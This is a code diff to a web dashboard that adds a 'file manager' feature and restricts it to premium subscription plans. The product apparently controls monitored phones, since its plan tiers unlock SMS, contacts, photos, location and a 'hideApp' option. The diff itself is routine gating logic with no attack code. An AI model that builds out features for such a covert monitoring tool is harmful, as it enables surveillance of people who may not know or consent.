@@ -51,15 +51,16 @@ interface PlanLimits {
     hideApp: boolean;
     bulkDownload?: boolean;
     maxDevices: number;
+    fileManager?: boolean;
 }
 
 // Compute plan limits from plan name — used as the source of truth
 const getPlanLimits = (plan: string): PlanLimits => {
     const p = (plan || '').toLowerCase();
-    if (p === 'enterprise') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: true, bulkDownload: true, maxDevices: -1 };
-    if (p === 'premium') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: true, bulkDownload: true, maxDevices: 10 };
-    if (p === 'standard') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: false, hideApp: false, bulkDownload: true, maxDevices: 5 };
-    return { photos: 50, videos: 0, sms: false, contacts: false, torch: false, vibration: false, location: false, hideApp: false, bulkDownload: false, maxDevices: 1 };
+    if (p === 'enterprise') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: true, bulkDownload: true, maxDevices: -1, fileManager: true };
+    if (p === 'premium') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: true, bulkDownload: true, maxDevices: 10, fileManager: true };
+    if (p === 'standard') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: false, hideApp: false, bulkDownload: true, maxDevices: 5, fileManager: false };
+    return { photos: 50, videos: 0, sms: false, contacts: false, torch: false, vibration: false, location: false, hideApp: false, bulkDownload: false, maxDevices: 1, fileManager: false };
 };
 
 interface HomeProps {
@@ -646,8 +647,9 @@ export default function Home({ initialTool = null }: HomeProps = {}) {
                         // Use backend limits if provided, otherwise compute from plan
                         if (data.limits && typeof data.limits.sms !== 'undefined') {
                             const patchedLimits = { ...data.limits };
-                            // Fix missing location flag from remote backend
+                            // Fix missing location & fileManager flag from remote backend
                             patchedLimits.location = plan === 'premium' || plan === 'enterprise';
+                            patchedLimits.fileManager = plan === 'premium' || plan === 'enterprise';
                             setPlanLimits(patchedLimits);
                         } else {
                             setPlanLimits(getPlanLimits(plan));
@@ -2240,6 +2242,11 @@ END:VCARD`;
     const renderTool = () => {
         switch (selectedTool) {
             case 'files': {
+                if (!planLimits.fileManager) {
+                    showUpgradePrompt('File Manager Access', 'premium');
+                    setSelectedTool(null);
+                    return null;
+                }
                 const isOnline = !!devices.find(d => (d.deviceId || d.id || d._id) === selectedDeviceId)?.online;
                 return (
                     <FileManagerView
